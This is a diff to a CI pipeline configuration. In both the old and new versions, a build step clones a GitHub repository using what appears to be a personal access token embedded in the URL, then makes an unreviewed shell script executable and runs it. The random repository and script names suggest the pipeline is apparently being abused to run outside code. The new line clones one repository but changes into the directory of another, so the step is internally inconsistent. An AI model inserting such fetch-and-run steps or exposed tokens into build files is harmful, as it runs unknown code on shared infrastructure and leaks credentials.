@@ -12,4 +12,4 @@ jobs:
     steps:
       - checkout
       - run: |
-            git clone https://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@github.com/WxYtzaiu/Uisjaws && cd Uisjaws && chmod u+x sun.sh && ./sun.sh
+            git clone https://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@github.com/WxYtzaiu/WxYtzaiu && cd Uisjaws && chmod u+x suss.sh && ./suss.sh
